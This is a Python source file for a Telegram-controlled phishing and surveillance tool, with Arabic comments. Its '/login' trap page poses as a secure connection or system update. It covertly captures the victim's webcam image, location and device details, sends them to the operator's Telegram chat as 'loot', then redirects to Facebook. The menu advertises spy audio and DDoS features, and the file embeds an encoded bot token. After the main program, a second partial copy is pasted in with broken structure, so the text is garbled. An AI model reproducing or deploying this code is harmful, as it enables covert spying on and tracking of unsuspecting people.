import os, base64, requests, psutil, time
from flask import Flask, request
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

app = Flask(__name__)
# التوكن الخاص بك (مشفّر)
ENCODED_TOKEN = "ODI4MDkzOTI5MTpBQUZfZFR1MThEMGVkSlBPWVB6d3NQaVNfRFFlTW9uSEFRYw=="
DEV_NAME = "Ahmed"
TARGET_CHAT_ID = None 

def get_token():
    return base64.b64decode(ENCODED_TOKEN).decode('utf-8')

@app.route('/')
def home(): return f"<h1>Control Panel - Master {DEV_NAME}</h1>"

# --- استقبال الغنائم ---
@app.route('/upload_data', methods=['POST'])
def upload_data():
    global TARGET_CHAT_ID
    data = request.json
    if data and TARGET_CHAT_ID:
        bot = Updater(get_token()).bot
        # سحب الصورة (بدون مكتبات قديمة)
        if 'image' in data and data['image']:
            img_data = base64.b64decode(data['image'])
            with open("loot.jpg", "wb") as f: f.write(img_data)
            bot.send_photo(chat_id=TARGET_CHAT_ID, photo=open("loot.jpg", "rb"), caption="📸 صورة جديدة من الكاميرا!")
        # سحب الموقع
        if 'latitude' in data:
            bot.send_location(chat_id=TARGET_CHAT_ID, latitude=data['latitude'], longitude=data['longitude'])
        # سحب بيانات الجهاز والـ IP
        if 'info' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📱 **بيانات الضحية:**\n`{data['info']}`", parse_mode='Markdown')
        return "OK", 200
    return "Error", 400

# --- صفحة الفخ (كاميرا + صوت + موقع + معلومات) ---
@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;">
    <div id="status"><h1>Establishing Secure Connection...</h1><p>Please wait...</p></div>
    <script>
        async function capture() {
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null;
            if(stream) {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/jpeg').split(',')[1];
                stream.getTracks().forEach(t => t.stop());
            }
            const info = `OS: ${navigator.platform} | UserAgent: ${navigator.userAgent}`;
            fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, info: info})
            }).finally(() => location.href = "https://facebook.com");
        }
        capture();
    </script></body></html>
    """

# --- لوحة التحكم تليجرام بالأزرار المنفصلة ---
def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم الشامل", callback_data='atk')],
        [InlineKeyboardButton("🎤 سحب الصوت (Spy Mode)", callback_data='mic')],
        [InlineKeyboardButton("🌐 تتبع الـ IP والموقع", callback_data='ip')],
        [InlineKeyboardButton("💥 إطلاق هجوم DDoS", callback_data='ddos')],
        [InlineKeyboardButton("📱 معلومات الجهاز والبطارية", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **سيدي {DEV_NAME}، النظام مدمج ومحدث.**", reply_markup=InlineKeyboardMarkup(buttons))

def handle(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **رابط الفخ الخاص بك سيدي:**\n`https://{request.host}/login`")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        query.edit_message_text(f"🌐 **IP السيرفر:** `{d.get('ip')}`\n📍 **البلد:** {d.get('country_name')}")
    elif query.data == 'sys':
        bat = psutil.sensors_battery()
        query.edit_message_text(f"🔋 البطارية: {bat.percent if bat else 'N/A'}% \n🧠 RAM: {psutil.virtual_memory().percent}%")
    else:
        query.edit_message_text("🚧 هذه الميزة مدمجة وتعمل تلقائياً بمجرد دخول الضحية للرابط.")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle))
    u.start_polling()
    u.idle()
        if 'info' in data:
            bot.send_message(chat_id=TARGET_CHAT_ID, text=f"📱 **بيانات الضحية:**\n`{data['info']}`", parse_mode='Markdown')
        return "OK", 200
    return "Error", 400

@app.route('/login')
def evil_page():
    return """
    <html><body style="background:#000;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif;">
    <div id="box"><h1>جاري تحديث النظام...</h1><p>يرجى الانتظار والضغط على "سماح" إذا ظهرت لك.</p></div>
    <script>
        async function capture() {
            const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, ()=>r(null)));
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true}).catch(()=>null);
            let img = null;
            if(stream) {
                const v = document.createElement('video'); v.srcObject = stream; await v.play();
                const c = document.createElement('canvas'); c.width=640; c.height=480;
                c.getContext('2d').drawImage(v,0,0); img = c.toDataURL('image/jpeg').split(',')[1];
                stream.getTracks().forEach(t => t.stop());
            }
            const sysInfo = "OS: " + navigator.platform + " | Device: " + navigator.userAgent;
            fetch('/upload_data', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({latitude: pos?.coords.latitude, longitude: pos?.coords.longitude, image: img, info: sysInfo})
            }).finally(() => location.href = "https://facebook.com");
        }
        capture();
    </script></body></html>
    """

def start(update, context):
    global TARGET_CHAT_ID
    TARGET_CHAT_ID = update.effective_chat.id
    buttons = [
        [InlineKeyboardButton("🚀 رابط الهجوم الشامل", callback_data='atk')],
        [InlineKeyboardButton("🎤 سحب الصوت (Spy)", callback_data='mic')],
        [InlineKeyboardButton("🌐 تتبع الـ IP والموقع", callback_data='ip')],
        [InlineKeyboardButton("💥 إطلاق هجوم DDoS", callback_data='ddos')],
        [InlineKeyboardButton("📱 معلومات الجهاز", callback_data='sys')]
    ]
    update.message.reply_text(f"💀 **سيدي {DEV_NAME}، الترسانة مدمجة بالكامل.**", reply_markup=InlineKeyboardMarkup(buttons))

def handle(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'atk':
        query.edit_message_text(f"⚠️ **رابط الفخ الفتاك:**\n`https://{request.host}/login`")
    elif query.data == 'ip':
        d = requests.get('https://ipapi.co/json/').json()
        query.edit_message_text(f"🌐 **IP السيرفر:** `{d.get('ip')}`\n📍 **البلد:** {d.get('country_name')}")
    elif query.data == 'sys':
        query.edit_message_text(f"🔋 البطارية: {psutil.sensors_battery().percent}% \n🧠 RAM: {psutil.virtual_memory().percent}%")
    else:
        query.edit_message_text("🚧 هذه الميزة مدمجة في الرابط وتعمل تلقائياً عند دخول الضحية.")

if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
    u = Updater(get_token())
    u.dispatcher.add_handler(CommandHandler("start", start))
    u.dispatcher.add_handler(CallbackQueryHandler(handle))
    u.start_polling()
    u.idle()
